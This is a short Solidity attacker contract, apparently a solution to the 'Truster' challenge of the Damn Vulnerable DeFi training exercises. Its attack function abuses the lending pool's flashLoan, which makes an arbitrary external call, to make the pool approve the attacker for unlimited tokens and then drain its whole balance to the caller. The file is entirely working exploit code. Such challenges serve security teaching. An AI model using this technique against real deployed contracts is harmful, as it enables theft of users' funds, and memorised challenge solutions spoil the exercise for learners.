// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract TrusterLenderPoolAttacker {
    TrusterLenderPool immutable pool;
    IERC20 immutable token;

    constructor(TrusterLenderPool pool_, IERC20 token_) {
        pool = pool_;
        token = token_;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
    }
}
